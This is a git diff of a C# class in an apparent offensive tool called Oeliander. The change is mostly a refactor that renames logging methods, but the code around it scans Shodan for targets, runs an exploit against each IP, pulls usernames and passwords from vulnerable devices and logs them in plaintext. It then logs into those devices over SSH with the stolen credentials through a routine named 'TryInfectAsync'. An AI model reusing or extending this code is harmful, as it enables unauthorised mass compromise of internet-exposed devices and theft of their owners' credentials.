@@ -13,7 +13,7 @@ using static Oeliander.MainWindow;
 
 namespace Oeliander
 {
-    public class NewHelper
+    public class newHelper
     {
         #region Locals
 
@@ -46,7 +46,7 @@ namespace Oeliander
             {
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddLog($"[-] '{ip}' is not a valid IP!");
+                    mainFormObject.addLog($"[-] '{ip}' is not a valid IP!");
                 });
                 Console.WriteLine($"'{ip}' is not a valid IP!"); return null; 
             }
@@ -54,15 +54,15 @@ namespace Oeliander
             byte[] ResponseBytes = new byte[BufferSize];
             using (Socket Socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
             {
-                Socket.ReceiveTimeout = Convert.ToInt32(MainWindow.settings.Connection_Timeout);
-                Socket.SendTimeout = Convert.ToInt32(MainWindow.settings.Connection_Timeout);
+                Socket.ReceiveTimeout = Convert.ToInt32(_Settings.settings.Connection_Timeout);
+                Socket.SendTimeout = Convert.ToInt32(_Settings.settings.Connection_Timeout);
 
                 try { Socket.Connect(new IPEndPoint(addr, port)); }
                 catch (SocketException ex) 
                 {
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
-                        mainFormObject.AddToLogFile($"[-] {ip}: Timed out! {ex.Message}");
+                        mainFormObject.addToLogFile($"[-] {ip}: Timed out! {ex.Message}");
                     });
                     Console.WriteLine($"{ip}: Timed out!"); return null; 
                 }
@@ -70,8 +70,8 @@ namespace Oeliander
                 {
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
-                        mainFormObject.AddToLogFile($"[-] {ip}: Unknown error: {ex.Message} \n");
-                        mainFormObject.AddLog($"[-] {ip}: Unknown error: {ex.Message}");
+                        mainFormObject.addToLogFile($"[-] {ip}: Unknown error: {ex.Message} \n");
+                        mainFormObject.addLog($"[-] {ip}: Unknown error: {ex.Message}");
                     });
                     Console.WriteLine($"{ip}: Unknown error: {ex.Message}"); return null;
                 }
@@ -84,7 +84,7 @@ namespace Oeliander
                 {
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
-                        mainFormObject.AddLog($"[-] {ip}: {ex.Message}");
+                        mainFormObject.addLog($"[-] {ip}: {ex.Message}");
                     });
                     Console.WriteLine($"{ip}: {ex.Message}"); return null; 
                 }
@@ -134,9 +134,9 @@ namespace Oeliander
                 ssh.SendCMD("whoami", mainFormObject);
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                    mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
-                    mainFormObject.AddCred(user, ip, true);
+                    mainFormObject.addLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                    mainFormObject.addToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
+                    mainFormObject.addCred(user, ip, true);
                 });
                 Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
             }
@@ -144,9 +144,9 @@ namespace Oeliander
             {
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                    mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
-                    mainFormObject.AddCred(user, ip, false);
+                    mainFormObject.addLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                    mainFormObject.addToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
+                    mainFormObject.addCred(user, ip, false);
                 });
                 Console.WriteLine($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}");
             }
@@ -159,9 +159,9 @@ namespace Oeliander
                 ssh.SendCMD("whoami", mainFormObject);
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                    mainFormObject.AddToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
-                    mainFormObject.AddCred(user, ip, true);
+                    mainFormObject.addLog($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                    mainFormObject.addToLogFile($"[+] SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
+                    mainFormObject.addCred(user, ip, true);
                 });
                 Console.WriteLine($"SUCCESS: '{user.Username}@{ip}' using password: {user.Password}");
             }
@@ -169,9 +169,9 @@ namespace Oeliander
             {
                 mainFormObject.Dispatcher.Invoke(() =>
                 {
-                    mainFormObject.AddLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
-                    mainFormObject.AddToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
-                    mainFormObject.AddCred(user, ip, false);
+                    mainFormObject.addLog($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n-------------------------------\n");
+                    mainFormObject.addToLogFile($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}\n");
+                    mainFormObject.addCred(user, ip, false);
                 });
                 Console.WriteLine($"[!] FAILED: '{user.Username}@{ip}' using password: {user.Password}");
             }
@@ -191,7 +191,7 @@ namespace Oeliander
                 {
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
-                        mainFormObject.AddLog(text + " " + Convert.ToString(dataTwo));
+                        mainFormObject.addLog(text + " " + Convert.ToString(dataTwo));
                     });
                     logger(text, dataTwo);
                 }
@@ -199,8 +199,8 @@ namespace Oeliander
                 {
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
-                        mainFormObject.AddLog(text);// + Environment.NewLine);
-                        mainFormObject.AddToLogFile(text + Environment.NewLine);
+                        mainFormObject.addLog(text);// + Environment.NewLine);
+                        mainFormObject.addToLogFile(text + Environment.NewLine);
                     });
                     logger(text, null);
                 }
@@ -288,7 +288,7 @@ namespace Oeliander
                     foreach (string _tar in _ip)
                     {
                         usersList = GetUsers(_tar);
-                        mainFormObject.AddCred(usersList, _tar);
+                        mainFormObject.addCred(usersList, _tar);
                         if (usersList != null && usersList.Count > 0)
                         {
                             List<Thread> sshThreads = new List<Thread>();
@@ -296,7 +296,7 @@ namespace Oeliander
                             {
                                 mainFormObject.Dispatcher.Invoke(() =>
                                 {
-                                    mainFormObject.AddLog($"[!] {GetTime()} CREDENTIALS FOUND:\n Username: {user.Username.PadRight(32)} Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
+                                    mainFormObject.addLog($"[!] {GetTime()} CREDENTIALS FOUND:\n Username: {user.Username.PadRight(32)} Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                                 });
                                 Save($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}", "Credentials");
                                 Console.WriteLine($"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}", "Complete");
@@ -307,7 +307,7 @@ namespace Oeliander
                             {
                                 mainFormObject.Dispatcher.Invoke(() =>
                                 {
-                                    mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}");// + Environment.NewLine);
+                                    mainFormObject.addLog($"[?] Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}");// + Environment.NewLine);
                                 });
                                 string _1 = $"Attempting to SSH into '{user.Username}@{_tar}' using password: {user.Password}";
                                 Save(_1, "List");
@@ -326,8 +326,8 @@ namespace Oeliander
                         {
                             mainFormObject.Dispatcher.Invoke(() =>
                             {
-                                mainFormObject.AddLog("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!");// + Environment.NewLine);
-                                mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!\n");// + Environment.NewLine);
+                                mainFormObject.addLog("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!");// + Environment.NewLine);
+                                mainFormObject.addToLogFile("[!] Exploit Failed: Target " + _tar + " might not be vulnerable!\n");// + Environment.NewLine);
                             });
                             Console.WriteLine("Exploit Failed: Target might not be vulnerable!");
                         }
@@ -341,15 +341,15 @@ namespace Oeliander
                         List<Thread> sshThreads = new List<Thread>();
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
-                            mainFormObject.AddLog($"[+] {GetTime()} CREDENTIALS FOUND:");
+                            mainFormObject.addLog($"[+] {GetTime()} CREDENTIALS FOUND:");
                         });
                         foreach (User user in users)
                         {
 
                             mainFormObject.Dispatcher.Invoke(() =>
                             {
-                                mainFormObject.AddLog($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
-                                mainFormObject.AddToLogFile($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
+                                mainFormObject.addLog($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
+                                mainFormObject.addToLogFile($"[+] Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}");
                             });
                             string _1 = $"Username: {user.Username}".PadRight(32) + $"Password: {user.Password}".PadRight(32) + $"IPAddress: {target}";
                             Save(_1, "Credentials");
@@ -385,7 +385,7 @@ namespace Oeliander
                             ///
                             mainFormObject.Dispatcher.Invoke(() =>
                             {
-                                mainFormObject.AddLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");// + Environment.NewLine);
+                                mainFormObject.addLog($"[?] Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");// + Environment.NewLine);
                             });
                             Console.WriteLine($"Attempting to SSH into '{user.Username}@{target}' using password: {user.Password}");
                             TryInfectAsync(target, user);
@@ -397,8 +397,8 @@ namespace Oeliander
                     {
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
-                            mainFormObject.AddLog("[!] Exploit Failed: Target " + target + " might not be vulnerable!");// + Environment.NewLine);
-                            mainFormObject.AddToLogFile("[!] Exploit Failed: Target " + target + " might not be vulnerable!\n");// + Environment.NewLine);
+                            mainFormObject.addLog("[!] Exploit Failed: Target " + target + " might not be vulnerable!");// + Environment.NewLine);
+                            mainFormObject.addToLogFile("[!] Exploit Failed: Target " + target + " might not be vulnerable!\n");// + Environment.NewLine);
                         });
                         Console.WriteLine("Exploit Failed: Target might not be vulnerable!");
                     }
@@ -421,7 +421,7 @@ namespace Oeliander
             string ShodanScan = "";
             if (usingShodan) { ShodanScan = "(Shodan Scan) "; }
             else { ShodanScan = ""; }
-            mainFormObject.AddToLogFile("\t[*] Scan Started" + ShodanScan + ": " + GetTime() + Environment.NewLine + Environment.NewLine);
+            mainFormObject.addToLogFile("\t[*] Scan Started" + ShodanScan + ": " + GetTime() + Environment.NewLine + Environment.NewLine);
             mainFormObject.StartButton.Content = "Stop";
             _using = _osVersion = _intTarget;
             try
@@ -439,9 +439,9 @@ namespace Oeliander
                         _results = ShodanScanner.sr;
                         mainFormObject.Dispatcher.Invoke(() =>
                         {
-                            mainFormObject.AddTargetNum(_results.matches.Count);
-                            mainFormObject.AddLog("[*] Found " + _results.matches.Count + " target IP's");
-                            mainFormObject.AddToLogFile("[*] Found " + _results.matches.Count + " target IP's");
+                            mainFormObject.addTargetNum(_results.matches.Count);
+                            mainFormObject.addLog("[*] Found " + _results.matches.Count + " target IP's");// + Environment.NewLine);
+                            mainFormObject.addToLogFile("[*] Found " + _results.matches.Count + " target IP's");// + Environment.NewLine);
                         });
                         Console.WriteLine("Found " + _results.matches.Count + " IP's");
                         foreach (Match m in _results.matches)
@@ -449,8 +449,8 @@ namespace Oeliander
                             SaveShodan($"FOUND IPADDRESS: {m.ip}");
                             mainFormObject.Dispatcher.Invoke(() =>
                             {
-                                mainFormObject.AddLog($"[?] Attempting to Exploit: {m.ip_str}");
-                                mainFormObject.AddToLogFile($"[?] Attempting to Exploit: {m.ip_str}\n");
+                                mainFormObject.addLog($"[?] Attempting to Exploit: {m.ip_str}");// + Environment.NewLine);
+                                mainFormObject.addToLogFile($"[?] Attempting to Exploit: {m.ip_str}\n");
                             });
                             Console.WriteLine($"Attempting: {m.ip_str}");
                             _using = m.ip_str;
@@ -469,7 +469,7 @@ namespace Oeliander
                         _ = $"IP: {_intTarget}";
                     mainFormObject.Dispatcher.Invoke(() =>
                     {
-                        mainFormObject.AddLog($"[?] [{DateTime.Now.ToString("G")}]: Attempting to exploit provided {_}");// + Environment.NewLine);
+                        mainFormObject.addLog($"[?] [{DateTime.Now.ToString("G")}]: Attempting to exploit provided {_}");// + Environment.NewLine);
                     });
                     threadRunner = new Thread(() => TryExploit(_intTarget));
                     threadRunner.Start();
@@ -483,7 +483,7 @@ namespace Oeliander
 
         public void Stop()
         {
-            mainFormObject.AddLog(GetTime() + ": Scan Threads are being Aborted");
+            mainFormObject.addLog(GetTime() + ": Scan Threads are being Aborted");
             if (threadRunner.IsAlive) { 
                 try
                 {
@@ -492,15 +492,15 @@ namespace Oeliander
                 catch (Exception ex)
                 { 
                     Console.WriteLine(ex.ToString());
-                    mainFormObject.AddLog(ex.ToString());
+                    mainFormObject.addLog(ex.ToString());
                 }
             }
             Thread.Sleep(5000);
-            mainFormObject.AddLog($"[!] {GetTime()} Scan stopped successfully\n");
-            mainFormObject.AddToLogFile("\n\n\t[*] End of Scan: " + GetTime() + "\n\n###############################################################################\n\n");
+            mainFormObject.addLog($"[!] {GetTime()} Scan stopped successfully\n");
+            mainFormObject.addToLogFile("\n\n\t[*] End of Scan: " + GetTime() + "\n\n###############################################################################\n\n");
             mainFormObject.StartButton.Content = "Start";
         }
-        public NewHelper(Action<string, object> objLogger, bool needInvoke, MainWindow main)
+        public newHelper(Action<string, object> objLogger, bool needInvoke, MainWindow main)
         {
             mainFormObject = main;
             logger = objLogger;
